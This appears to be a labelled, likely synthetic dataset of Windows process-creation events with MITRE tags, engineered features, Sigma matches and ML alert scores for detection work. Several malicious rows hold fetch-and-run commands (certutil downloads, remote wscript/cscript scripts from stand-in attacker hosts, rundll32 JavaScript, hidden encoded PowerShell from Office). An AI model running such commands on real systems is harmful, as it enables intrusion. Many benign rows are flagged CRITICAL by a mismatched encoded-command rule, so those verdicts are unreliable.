UtcTime,ProcessGuid,ProcessId,Image,CommandLine,ParentImage,ParentCommandLine,ParentProcessId,User,IntegrityLevel,is_malicious,mitre_technique_id,technique_name,label,parent_process_name,child_process_name,is_known_lolbin,is_scripting_engine,command_line_length,command_line_entropy,has_suspicious_flag,contains_url,contains_ip_address,has_base64_pattern,argument_count,suspicious_argument_ratio,has_encoded_command,has_download_indicator,process_ancestry_depth,parent_is_office_app,parent_is_browser,parent_is_script_engine,chain_hash,hour_of_day,is_off_hours,is_weekend,minute_of_hour,parent_child_pair_rarity,command_length_zscore,entropy_zscore,is_system_user,user_encoded,integrity_encoded,sigma_match,sigma_rule_name,sigma_level,sigma_mitre_tags,ml_anomaly_score,chain_risk_score,chain_description,chain_matched_pattern,final_verdict,priority,confidence,explanation
2024-07-04T15:44:25.889Z,{82737D26-B794-45B1-838A-4C58FD903FAC},44104,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"powershell.exe -NoProfile -Command ""Get-ADUser -Filter * -Properties LastLogonDate, Department, Title | Where-Object {$_.LastLogonDate -lt (Get-Date).AddDays(-90)} | Select Name, SamAccountName, LastLogonDate, Department | Export-Csv C:\Reports\stale_accounts.csv -NoTypeInformation""",C:\Windows\System32\cmd.exe,cmd.exe,64294,CORP\admin,High,0,,,gray_area,1,3,1,1,283,4.9821,1,0,0,0,25,0.04,0,0,2,0,0,1,4082297620,15,0,0,44,1.3846,9.875173906419766,1.7208655922592033,0,3,2,True,PowerShell Encoded Command Execution,high,attack.t1059.001,99.26243810117822,5,cmd.exe → powershell.exe: No known suspicious pattern [Modifiers: +5 suspicious flags],False,ALERT,CRITICAL,99.9,Sigma rule matched: PowerShell Encoded Command Execution | ML Score: 99 | Chain Risk: 5
2024-07-03T04:00:55.642Z,{7F3CEA07-D7F3-497E-AEB5-FA193C7956E6},5633,C:\Windows\System32\rundll32.exe,"rundll32.exe javascript:""\..\mshtml,RunHTMLApplication "";document.write();new%20ActiveXObject(""WScript.Shell"").Run(""cmd /c update466.exe"")",C:\Windows\explorer.exe,cmd.exe,26223,CORP\klee,Medium,1,T1218.011,Rundll32 JavaScript,malicious,0,1,1,0,138,5.1302,1,0,0,0,5,0.2,0,0,1,0,0,0,788896773,4,1,0,0,3.9031,4.061531127569315,1.9426255609117586,0,6,1,True,Rundll32 JavaScript Execution,critical,attack.t1218.011,96.90636894643376,40,"explorer.exe → rundll32.exe: Explorer launching rundll32 [Modifiers: +10 off-hours, +5 suspicious flags]",True,ALERT,CRITICAL,99.7,Sigma rule matched: Rundll32 JavaScript Execution | ML Score: 97 | Chain Risk: 40
2024-07-04T08:27:12.705Z,{9CB35F44-1594-4496-84EC-B73DCDD3B343},60598,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"powershell.exe -NoProfile -Command ""Get-Service | Where-Object {$_.Status -eq 'Running'}""",C:\Windows\System32\cmd.exe,C:\Windows\System32\cmd.exe,9645,CORP\sysadmin,High,0,,,benign,1,3,1,1,89,4.9011,1,0,0,0,9,0.1111,0,0,2,0,0,1,4082297620,8,0,0,27,1.3846,2.0969208091991622,1.599578911227083,0,10,2,True,PowerShell Encoded Command Execution,high,attack.t1059.001,52.631701808360845,5,cmd.exe → powershell.exe: No known suspicious pattern [Modifiers: +5 suspicious flags],False,ALERT,CRITICAL,95.3,Sigma rule matched: PowerShell Encoded Command Execution | ML Score: 53 | Chain Risk: 5
2024-07-01T14:40:19.743Z,{6D57C823-1180-42B2-8F0D-91665CE42ECE},46838,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"powershell.exe -NoProfile -Command ""Get-ADUser -Filter * -Properties LastLogonDate | Select Name, LastLogonDate""",C:\Windows\explorer.exe,C:\Windows\explorer.exe,50494,CORP\mjones,Medium,0,,,benign,0,3,1,1,112,4.5569,1,0,0,0,12,0.0833,0,0,1,0,0,0,945137867,14,0,0,40,1.231,3.0190848361892337,1.084185385162199,0,0,1,True,PowerShell Encoded Command Execution,high,attack.t1059.001,55.26095746679433,5,explorer.exe → powershell.exe: No known suspicious pattern [Modifiers: +5 suspicious flags],False,ALERT,CRITICAL,95.5,Sigma rule matched: PowerShell Encoded Command Execution | ML Score: 55 | Chain Risk: 5
2024-07-01T16:46:53.195Z,{B84E5E4C-FED7-44D3-A01A-70E9549EB978},4377,C:\Windows\System32\cmd.exe,cmd.exe /c tracert 8.8.8.8,C:\Windows\explorer.exe,C:\Windows\explorer.exe,18593,CORP\analyst01,Medium,0,,,benign,0,4,1,1,26,3.3826,0,0,1,0,4,0.0,0,0,1,0,0,0,2764436884,16,0,0,46,0.9208,-0.42900674299103336,-0.6741720165170381,0,13,1,False,None,none,,79.46453639741068,0,explorer.exe → cmd.exe: No known suspicious pattern,False,ALERT,MEDIUM,56.3,"ANOMALY SCORE: 79/100 | Unusual factors: IP address in command line: 1.00 (baseline: 0.01±0.11, z=8.9)"
2024-07-04T10:26:01.880Z,{28C93005-3645-4C4F-916D-6C191DC9AFB0},35596,C:\Windows\System32\schtasks.exe,"schtasks.exe /create /tn ""NightlyBackup"" /tr ""C:\Scripts\backup.bat"" /sc daily /st 02:00",C:\Windows\System32\cmd.exe,cmd.exe,21799,CORP\sysadmin,High,0,,,gray_area,1,15,0,0,88,4.568,0,0,0,0,10,0.0,0,0,2,0,0,1,200102300,10,0,0,26,3.9031,2.0568267210691595,1.1008061525628967,0,10,2,False,None,none,,71.98844715090806,0,cmd.exe → schtasks.exe: No known suspicious pattern,False,ALERT,MEDIUM,51.3,"ANOMALY SCORE: 72/100 | Unusual factors: unusual parent-child process relationship: 3.90 (baseline: 1.63±0.36, z=6.4); spawned by script engine: 1.00 (baseline: 0.06±0.24, z=3.9); unusual number of arguments: 10.00 (baseline: 3.17±2.29, z=3.0); deep process chain (possible multi-stage): 2.00 (baseline: 1.16±0.37, z=2.3); unusually long command line: 88.00 (baseline: 36.70±24.93, z=2.1)"
2024-07-03T19:28:04.503Z,{19650D4D-93EF-4743-9502-0F1DE40F4582},65187,C:\Windows\System32\certutil.exe,certutil.exe -urlcache -f http://exploit-kit4226.org/svc284.exe C:\Users\Public\update392.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,cmd.exe,61855,CORP\mjones,Medium,1,T1105,Certutil Download,malicious,4,8,1,0,93,4.7425,1,1,0,0,5,0.2,0,1,2,0,0,1,2657444117,19,0,0,28,3.9031,2.257297161719175,1.3620965950333277,0,0,1,True,Certutil URL Cache Download,high,attack.t1105,88.75835065479637,85,"powershell.exe → certutil.exe: PowerShell invoking certutil [Modifiers: +15 URL in command, +5 suspicious flags]",True,ALERT,CRITICAL,98.9,Sigma rule matched: Certutil URL Cache Download | ML Score: 89 | Chain Risk: 85
2024-07-01T10:08:00.195Z,{3520D76F-CAF1-432A-A473-9ED2B3DD7D99},8334,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"powershell.exe -Command ""Import-Module ActiveDirectory; Get-ADComputer -Filter {OperatingSystem -like '*Server*'} -Properties OperatingSystem, LastLogonDate | Select Name, OperatingSystem, LastLogonDate | Export-Csv C:\Reports\servers.csv""",C:\Windows\System32\cmd.exe,cmd.exe,54475,CORP\sysadmin,High,0,,,gray_area,1,3,1,1,239,4.8519,0,0,0,0,20,0.0,0,0,2,0,0,1,4082297620,10,0,0,8,1.3846,8.11103402869963,1.525908482748314,0,10,2,False,None,none,,94.1751564914698,0,cmd.exe → powershell.exe: No known suspicious pattern,False,ALERT,MEDIUM,66.1,"ANOMALY SCORE: 94/100 | Unusual factors: unusually long command line: 239.00 (baseline: 36.70±24.93, z=8.1); command length significantly above baseline: 8.11 (baseline: -0.00±1.00, z=8.1); unusual number of arguments: 20.00 (baseline: 3.17±2.29, z=7.3); spawned by script engine: 1.00 (baseline: 0.06±0.24, z=3.9); deep process chain (possible multi-stage): 2.00 (baseline: 1.16±0.37, z=2.3)"
2024-07-01T21:06:33.106Z,{74245DDB-2BA1-4C98-B4ED-5E10B9BCCA68},45924,C:\Windows\System32\certutil.exe,certutil.exe -urlcache -split -f http://darkops9655.xyz/module346.exe C:\Users\Public\core707.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,cmd.exe,30225,CORP\jsmith,Medium,1,T1105,Certutil Download,malicious,4,8,1,0,97,4.8408,1,1,0,0,6,0.1667,0,1,2,0,0,1,2657444117,21,0,0,6,3.9031,2.4176735142391874,1.5092877153476163,0,9,1,True,Certutil URL Cache Download,high,attack.t1105,89.32955271829645,85,"powershell.exe → certutil.exe: PowerShell invoking certutil [Modifiers: +15 URL in command, +5 suspicious flags]",True,ALERT,CRITICAL,98.9,Sigma rule matched: Certutil URL Cache Download | ML Score: 89 | Chain Risk: 85
2024-07-01T13:27:07.632Z,{BE1DE1B5-E8DF-4278-8EDB-3E3BA0594D8F},15856,C:\Windows\System32\rundll32.exe,"rundll32.exe shell32.dll,SHCreateLocalServerRunDll {GUID}",C:\Windows\explorer.exe,C:\Windows\explorer.exe,8909,CORP\jsmith,Medium,0,,,gray_area,0,1,1,0,57,4.4964,0,0,0,0,3,0.0,0,0,1,0,0,0,788896773,13,0,0,27,3.9031,0.813909989039063,0.9935947159962341,0,9,1,False,None,none,,71.50503368768167,25,explorer.exe → rundll32.exe: Explorer launching rundll32,True,ALERT,MEDIUM,51.0,"ANOMALY SCORE: 72/100 | Unusual factors: unusual parent-child process relationship: 3.90 (baseline: 1.63±0.36, z=6.4)"
2024-07-01T21:53:46.862Z,{F02C0592-5EED-496B-8502-07511D2BEBE0},10211,C:\Windows\System32\wscript.exe,wscript.exe //e:jscript http://malware-cdn5153.top/script923.js,C:\Windows\System32\cmd.exe,cmd.exe /c,16469,CORP\klee,Medium,1,T1059.005,WScript Remote Script,malicious,1,21,1,1,63,4.4814,1,1,0,0,3,0.3333,0,0,2,0,0,1,4144717783,21,0,0,53,3.9031,1.0544745178190815,0.9711342195088035,0,6,1,True,WScript or CScript Remote Script Execution,high,attack.t1059.005,91.49845132658851,75,"cmd.exe → wscript.exe: Command shell invoking WScript [Modifiers: +15 URL in command, +5 suspicious flags]",True,ALERT,CRITICAL,99.1,Sigma rule matched: WScript or CScript Remote Script Execution | ML Score: 91 | Chain Risk: 75
2024-07-02T14:52:13.506Z,{C5FEFCDA-4513-4DF9-B67E-2EEDDD718A33},18598,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"powershell.exe -NoProfile -Command ""Get-Service | Where-Object {$_.Status -eq 'Running'}""",C:\Windows\System32\cmd.exe,C:\Windows\System32\cmd.exe,22159,CORP\agarwal,Medium,0,,,benign,1,3,1,1,89,4.9011,1,0,0,0,9,0.1111,0,0,2,0,0,1,4082297620,14,0,0,52,1.3846,2.0969208091991622,1.599578911227083,0,12,1,True,PowerShell Encoded Command Execution,high,attack.t1059.001,50.591521122202465,5,cmd.exe → powershell.exe: No known suspicious pattern [Modifiers: +5 suspicious flags],False,ALERT,CRITICAL,95.1,Sigma rule matched: PowerShell Encoded Command Execution | ML Score: 51 | Chain Risk: 5
2024-07-04T23:46:47.900Z,{437D7BA1-7A4A-4BFA-9DB2-1EFFA80E79FE},9257,C:\Windows\System32\bitsadmin.exe,bitsadmin.exe /transfer wsus_update /download /priority normal http://internal-wsus.corp.local/update_kb6611860.cab C:\Windows\SoftwareDistribution\Download\update_kb6611860.cab,C:\Windows\System32\svchost.exe,C:\Windows\System32\svchost.exe -k netsvcs -p -s BITS,35109,NT AUTHORITY\SYSTEM,System,0,,,gray_area,2,24,1,0,177,4.8159,1,1,0,0,8,0.125,0,1,1,0,0,0,583731811,23,0,0,46,3.9031,5.625200564639437,1.4720032911784837,1,2,3,True,BITSAdmin File Download,high,attack.t1197,94.21631543720119,30,"svchost.exe → bitsadmin.exe: No known suspicious pattern [Modifiers: +15 URL in command, +10 LOLBin child, +5 suspicious flags]",False,ALERT,CRITICAL,99.4,Sigma rule matched: BITSAdmin File Download | ML Score: 94 | Chain Risk: 30
2024-07-05T03:46:03.861Z,{3FD44378-3482-42EE-9061-534340A80DF7},25443,C:\Windows\System32\bitsadmin.exe,bitsadmin.exe /transfer wsus_update /download /priority normal http://sccm01.corp.local/update_kb8092498.cab C:\Windows\SoftwareDistribution\Download\update_kb8092498.cab,C:\Windows\System32\svchost.exe,C:\Windows\System32\svchost.exe -k netsvcs -p -s BITS,18023,NT AUTHORITY\SYSTEM,System,0,,,gray_area,2,24,1,0,170,4.8889,1,1,0,0,8,0.125,0,1,1,0,0,0,583731811,3,1,0,46,3.9031,5.3445419477294145,1.5813110407506403,1,2,3,True,BITSAdmin File Download,high,attack.t1197,92.0902264252264,40,"svchost.exe → bitsadmin.exe: No known suspicious pattern [Modifiers: +15 URL in command, +10 LOLBin child, +10 off-hours, +5 suspicious flags]",False,ALERT,CRITICAL,99.2,Sigma rule matched: BITSAdmin File Download | ML Score: 92 | Chain Risk: 40
2024-07-03T13:38:44.205Z,{63FE433F-2E6F-4BFB-8C7B-A4075FC15C68},32392,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"powershell.exe -NoProfile -Command ""Install-Module -Name Az -AllowClobber -Force""",C:\Windows\explorer.exe,C:\Windows\explorer.exe,21590,CORP\agarwal,Medium,0,,,benign,0,3,1,1,81,4.4666,1,0,0,0,8,0.125,0,0,1,0,0,0,945137867,13,0,0,38,1.231,1.7761681041591375,0.9489731963078728,0,12,1,True,PowerShell Encoded Command Execution,high,attack.t1059.001,37.98982057080655,5,explorer.exe → powershell.exe: No known suspicious pattern [Modifiers: +5 suspicious flags],False,ALERT,CRITICAL,93.8,Sigma rule matched: PowerShell Encoded Command Execution | ML Score: 38 | Chain Risk: 5
2024-07-03T20:43:44.704Z,{17BC1B3D-C560-4CF4-9B13-73AD56C099CB},24758,C:\Windows\System32\cmd.exe,cmd.exe /c powershell -noni -nop -w hidden -enc QQBkAGQALQBUAHkAcABlACAALQBBAHMAcwBlAG0AYgBsAHkATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4ARAByAGEAdwBpAG4AZwA7ACQAZwA9AFsARAByAGEAdwBpAG4AZwAuAEIAaQB0AG0AYQBwAF0AOgA6AG4AZQB3ACgAJAB1ACkA,C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE,"""C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE"" /n document42.docm",7280,CORP\mjones,Medium,1,T1204.002,Office Macro Execution,malicious,10,4,1,1,224,4.6664,1,0,0,1,9,0.4444,1,0,2,1,0,0,1182374401,20,0,0,43,3.9031,7.509622706749583,1.248147009520436,0,0,1,True,Office Application Spawning Command Shell,critical,attack.t1204.002,100.0,100,"winword.exe → cmd.exe: Office Word spawning command shell (macro indicator) [Modifiers: +20 Office→Script chain, +10 encoded command, +5 suspicious flags]",True,ALERT,CRITICAL,100.0,Sigma rule matched: Office Application Spawning Command Shell | ML Score: 100 | Chain Risk: 100
2024-07-04T17:38:03.316Z,{5E210C65-5C23-4379-81D2-DFBE2BBBC326},44652,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"powershell.exe -NoProfile -Command ""Get-Service | Where-Object {$_.Status -eq 'Running'}""",C:\Windows\explorer.exe,C:\Windows\explorer.exe,49607,CORP\jsmith,Medium,0,,,benign,0,3,1,1,89,4.9011,1,0,0,0,9,0.1111,0,0,1,0,0,0,945137867,17,0,0,38,1.231,2.0969208091991622,1.599578911227083,0,9,1,True,PowerShell Encoded Command Execution,high,attack.t1059.001,44.906901784972604,5,explorer.exe → powershell.exe: No known suspicious pattern [Modifiers: +5 suspicious flags],False,ALERT,CRITICAL,94.5,Sigma rule matched: PowerShell Encoded Command Execution | ML Score: 45 | Chain Risk: 5
2024-07-04T19:05:20.727Z,{98EAB616-86CE-4653-A2FA-C595CE2D19A9},35761,C:\Windows\System32\certutil.exe,certutil.exe -encode C:\Users\Public\decoded773.exe C:\Users\Public\encoded9267.txt,C:\Windows\System32\cmd.exe,powershell.exe,29372,CORP\klee,Medium,1,T1140,Certutil Base64 Decode,malicious,1,8,1,0,83,4.3819,1,0,0,0,4,0.25,0,0,2,0,0,1,1473216238,19,0,0,5,3.9031,1.8563562804191438,0.8221462594755208,0,6,1,True,Certutil Base64 Encode or Decode,high,attack.t1140,89.9761280733795,50,cmd.exe → certutil.exe: Command shell invoking certutil,True,ALERT,CRITICAL,99.0,Sigma rule matched: Certutil Base64 Encode or Decode | ML Score: 90 | Chain Risk: 50
2024-07-03T14:46:54.244Z,{DE23CDBF-C6FE-452A-BA95-7E57516F0887},4794,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"powershell.exe -NoProfile -Command ""Restart-Service -Name Spooler -Force""",C:\Windows\explorer.exe,C:\Windows\explorer.exe,17022,CORP\mjones,Medium,0,,,benign,0,3,1,1,73,4.3563,1,0,0,0,7,0.1429,0,0,1,0,0,0,945137867,14,0,0,46,1.231,1.4554153991191128,0.7838136788036412,0,0,1,True,PowerShell Encoded Command Execution,high,attack.t1059.001,47.067404086703014,5,explorer.exe → powershell.exe: No known suspicious pattern [Modifiers: +5 suspicious flags],False,ALERT,CRITICAL,94.7,Sigma rule matched: PowerShell Encoded Command Execution | ML Score: 47 | Chain Risk: 5
2024-07-04T09:56:29.886Z,{5F975B3D-C3CF-4E96-8E8A-880CDAB41EDB},19501,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"powershell.exe -NoProfile -Command ""Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*""",C:\Windows\explorer.exe,C:\Windows\explorer.exe,51693,CORP\agarwal,Medium,0,,,benign,0,3,1,1,113,4.793,1,0,0,0,5,0.2,0,0,1,0,0,0,945137867,9,0,0,56,1.231,3.059178924319237,1.4377135998743413,0,12,1,True,PowerShell Encoded Command Execution,high,attack.t1059.001,66.94598353357364,5,explorer.exe → powershell.exe: No known suspicious pattern [Modifiers: +5 suspicious flags],False,ALERT,CRITICAL,96.7,Sigma rule matched: PowerShell Encoded Command Execution | ML Score: 67 | Chain Risk: 5
2024-07-06T02:44:14.314Z,{69CE52A6-CDBE-4A03-8E8B-D9C479039E02},9214,C:\Windows\System32\cmd.exe,cmd.exe /c powershell.exe -nop -w hidden -enc QQBkAGQALQBUAHkAcABlACAALQBBAHMAcwBlAG0AYgBsAHkATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4ARAByAGEAdwBpAG4AZwA7ACQAZwA9AFsARAByAGEAdwBpAG4AZwAuAEIAaQB0AG0AYQBwAF0AOgA6AG4AZQB3ACgAJAB1ACkA,C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE"" /n document91.docm",14752,CORP\mjones,Medium,1,T1204.002,Office Macro Execution,malicious,12,4,1,1,222,4.6536,1,0,0,1,8,0.375,1,0,2,1,0,0,1267013000,2,1,1,44,3.9031,7.429434530489576,1.2289807191844955,0,0,1,True,Office Application Spawning Command Shell,critical,attack.t1204.002,100.0,100,"excel.exe → cmd.exe: Excel spawning command shell (macro indicator) [Modifiers: +20 Office→Script chain, +10 off-hours, +10 encoded command, +5 suspicious flags]",True,ALERT,CRITICAL,100.0,Sigma rule matched: Office Application Spawning Command Shell | ML Score: 100 | Chain Risk: 100
2024-07-05T17:59:43.926Z,{64FA2CFC-4953-4637-817C-3F8B83474687},54522,C:\Windows\System32\msiexec.exe,msiexec.exe /i http://deploy.corp.local/package32.msi /quiet /norestart,C:\Windows\System32\cmd.exe,cmd.exe,57861,CORP\itops,High,0,,,gray_area,1,12,0,0,71,4.3838,0,1,0,0,5,0.0,0,0,2,0,0,1,67440360,17,0,0,59,3.9031,1.3752272228591065,0.8249912556972618,0,5,2,False,None,none,,70.15120481938771,15,cmd.exe → msiexec.exe: No known suspicious pattern [Modifiers: +15 URL in command],False,ALERT,MEDIUM,50.1,"ANOMALY SCORE: 70/100 | Unusual factors: URL found in command line: 1.00 (baseline: 0.01±0.11, z=9.4); unusual parent-child process relationship: 3.90 (baseline: 1.63±0.36, z=6.4); spawned by script engine: 1.00 (baseline: 0.06±0.24, z=3.9); deep process chain (possible multi-stage): 2.00 (baseline: 1.16±0.37, z=2.3)"
2024-07-04T13:25:29.790Z,{56390C3E-952D-4A4E-9616-B474906E4085},45535,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"powershell.exe -NoProfile -Command ""Get-Content C:\Scripts\inventory.ps1 | Out-File C:\Reports\output.txt""",C:\Windows\explorer.exe,C:\Windows\explorer.exe,39573,CORP\mjones,Medium,0,,,benign,0,3,1,1,106,4.6971,1,0,0,0,8,0.125,0,0,1,0,0,0,945137867,13,0,0,25,1.231,2.7785203074092153,1.294116158998041,0,0,1,True,PowerShell Encoded Command Execution,high,attack.t1059.001,41.49732246386975,5,explorer.exe → powershell.exe: No known suspicious pattern [Modifiers: +5 suspicious flags],False,ALERT,CRITICAL,94.1,Sigma rule matched: PowerShell Encoded Command Execution | ML Score: 41 | Chain Risk: 5
2024-07-01T15:40:42.714Z,{62DB4EA6-AE03-42AD-AFEC-F33C9CB51289},24476,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"powershell.exe -NoProfile -Command ""Get-ChildItem -Path C:\Logs -Recurse -Filter *.log""",C:\Windows\explorer.exe,C:\Windows\explorer.exe,56712,CORP\itops,High,0,,,benign,0,3,1,1,87,4.6553,1,0,0,0,9,0.1111,0,0,1,0,0,0,945137867,15,0,0,40,1.231,2.0167326329391564,1.2315262421197382,0,5,2,True,PowerShell Encoded Command Execution,high,attack.t1059.001,39.24171433320039,5,explorer.exe → powershell.exe: No known suspicious pattern [Modifiers: +5 suspicious flags],False,ALERT,CRITICAL,93.9,Sigma rule matched: PowerShell Encoded Command Execution | ML Score: 39 | Chain Risk: 5
2024-07-05T12:54:32.921Z,{3C7AB413-9B55-4684-B087-90D56D1D38FB},45518,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"powershell.exe -NoProfile -Command ""Get-NetTCPConnection | Where-Object {$_.State -eq 'Established'}""",C:\Windows\System32\cmd.exe,C:\Windows\System32\cmd.exe,54423,CORP\itops,High,0,,,benign,1,3,1,1,101,4.8107,1,0,0,0,9,0.1111,0,0,2,0,0,1,4082297620,12,0,0,54,1.3846,2.5780498667591996,1.4642169857295075,0,5,2,True,PowerShell Encoded Command Execution,high,attack.t1059.001,49.761495933163786,5,cmd.exe → powershell.exe: No known suspicious pattern [Modifiers: +5 suspicious flags],False,ALERT,CRITICAL,95.0,Sigma rule matched: PowerShell Encoded Command Execution | ML Score: 50 | Chain Risk: 5
2024-07-04T10:55:13.533Z,{50A1A84F-1FD3-41DF-B314-ACC3165661D0},63397,C:\Windows\System32\rundll32.exe,"rundll32.exe javascript:""\..\mshtml,RunHTMLApplication "";document.write();h=new%20ActiveXObject(""WScript.Shell"").Run(""powershell -nop -w hidden -enc JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtADsASQBFAFgAKABbAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAVQBUAEYAOAAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABzACkAKQA="")",C:\Windows\explorer.exe,explorer.exe,42109,CORP\jsmith,Medium,1,T1218.011,Rundll32 JavaScript,malicious,0,1,1,0,339,5.3281,1,0,0,1,8,0.5,1,0,1,0,0,0,788896773,10,0,0,55,3.9031,12.12044284169994,2.238954377902579,0,9,1,True,Rundll32 JavaScript Execution,critical,attack.t1218.011,96.08018008900574,40,"explorer.exe → rundll32.exe: Explorer launching rundll32 [Modifiers: +10 encoded command, +5 suspicious flags]",True,ALERT,CRITICAL,99.6,Sigma rule matched: Rundll32 JavaScript Execution | ML Score: 96 | Chain Risk: 40
2024-07-03T10:23:30.732Z,{D8F3F73B-74FB-42B1-B877-1ED83CBC5E97},25100,C:\Windows\System32\cscript.exe,cscript.exe //e:vbscript http://beacon-drop6149.net/script434.vbs,C:\Windows\System32\cmd.exe,cmd.exe /c,54829,CORP\klee,Medium,1,T1059.005,WScript Remote Script,malicious,1,59,1,1,65,4.3767,1,1,0,0,3,0.3333,0,0,2,0,0,1,100619687,10,0,0,23,3.9031,1.1346626940790878,0.8143599540265447,0,6,1,True,WScript or CScript Remote Script Execution,high,attack.t1059.005,91.27566620535654,70,cmd.exe → cscript.exe: Command shell invoking CScript [Modifiers: +15 URL in command],True,ALERT,CRITICAL,99.1,Sigma rule matched: WScript or CScript Remote Script Execution | ML Score: 91 | Chain Risk: 70
2024-07-02T12:15:16.674Z,{74453C59-040C-4388-B66B-9A7C43165704},11101,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"powershell.exe -NoProfile -Command ""Get-Service | Where-Object {$_.Status -eq 'Running'}""",C:\Windows\System32\cmd.exe,C:\Windows\System32\cmd.exe,47873,CORP\jsmith,Medium,0,,,benign,1,3,1,1,89,4.9011,1,0,0,0,9,0.1111,0,0,2,0,0,1,4082297620,12,0,0,15,1.3846,2.0969208091991622,1.599578911227083,0,9,1,True,PowerShell Encoded Command Execution,high,attack.t1059.001,50.08857176103217,5,cmd.exe → powershell.exe: No known suspicious pattern [Modifiers: +5 suspicious flags],False,ALERT,CRITICAL,95.0,Sigma rule matched: PowerShell Encoded Command Execution | ML Score: 50 | Chain Risk: 5
2024-07-02T03:16:55.603Z,{534233A0-9120-4229-A830-A5CB7B970F14},4665,C:\Windows\System32\wscript.exe,wscript.exe //e:jscript http://cobaltstrike6398.xyz/script224.js,C:\Windows\System32\cmd.exe,cmd.exe /c,33136,CORP\agarwal,Medium,1,T1059.005,WScript Remote Script,malicious,1,21,1,1,64,4.4746,1,1,0,0,3,0.3333,0,0,2,0,0,1,4144717783,3,1,0,16,3.9031,1.0945686059490847,0.9609521277678352,0,12,1,True,WScript or CScript Remote Script Execution,high,attack.t1059.005,92.42224207637256,85,"cmd.exe → wscript.exe: Command shell invoking WScript [Modifiers: +15 URL in command, +10 off-hours, +5 suspicious flags]",True,ALERT,CRITICAL,99.2,Sigma rule matched: WScript or CScript Remote Script Execution | ML Score: 92 | Chain Risk: 85
